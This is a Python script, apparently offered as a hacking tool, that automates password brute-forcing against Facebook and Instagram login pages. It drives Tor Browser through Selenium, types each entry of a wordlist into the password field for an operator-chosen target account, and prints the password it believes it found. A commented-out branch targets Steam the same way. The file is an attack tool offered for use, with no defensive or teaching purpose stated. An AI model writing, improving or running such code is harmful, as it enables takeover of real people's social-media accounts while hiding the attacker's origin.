"""
BRUTEFORCE BOT FOR ANY SOCIAL-MEDIA
@AUTHOR crypt0sploit
@DATE 1 Mar 2019
"""

from selenium import webdriver
from selenium.webdriver.common import keys
from selenium.common.exceptions import *
from tbselenium.tbdriver import TorBrowserDriver
import sys
from os.path import *
import time
import pyautogui
from string import *
from random import *

script, service, password1 = sys.argv

class brute_bot:

    def __init__(self, email, password, site, email_field, pass_field):
        self.email = email
        self.password = password
        self.site = site
        self.email_field = email_field
        self.pass_field = pass_field
        self.driver = TorBrowserDriver('/root/tor-browser_en-US/') # Specify the location of TOR Browser

    def Close_Browser(self):
        self.driver.close()

    def bruteforcer(self):
        driver = self.driver
        pass_found = False

        while not pass_found:
            driver.get(self.site)
            time.sleep(3)
            for i in self.password:
                try:
                    email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
                    email_box.clear()
                    email_box.send_keys(self.email)   
                    password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
                    password_box.clear()
                    password_box.send_keys(i)
                    pyautogui.press('enter')
                    time.sleep(4)
                    old = i 
                    print(f"Trying - {i}") 
                except NoSuchElementException: 
                    pass_found = True 
                    if pass_found == True: 
                        print(f'Password is >> {old} ')
                        break

def main_menu():

    if service == "facebook":
        site = "https://www.facebook.com"
        print("Waking up BOT...")
        efield = 'email'
        pfield = 'pass'
        time.sleep(2)
        email1 = str(input("\nThe Email Address/ Phone NUMBER of the target >> "))
        target = open(password1, 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield)
        execute.bruteforcer()
    
    elif service == "instagram":
        site = "https://www.instagram.com/accounts/login/?source=auth_switcher"
        print("Waking up BOT...")
        efield = 'username'
        pfield = 'password'
        time.sleep(2)
        email1 = str(input("\nThe Username of the Target >> "))
        target = open(password1)
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield)
        execute.bruteforcer()

    #elif service == "steam":
    #    site = "https://store.steampowered.com/login/?redir=&redir_ssl=1"
    #    print("Waking up BOT...")
    #    efield = 'username'
    #    pfield = 'password'
    #    time.sleep(2)
    #    email1 = str(input("\nThe Username of the Target >> "))
    #    target = open(password1)
    #    readpass = target.readlines()
    #   execute = brute_bot(email1, readpass, site, efield, pfield)
    #   execute.bruteforcer()

    else:
        print("Wrong argv !!")
        exit(0)

if __name__ == "__main__":
    main_menu()
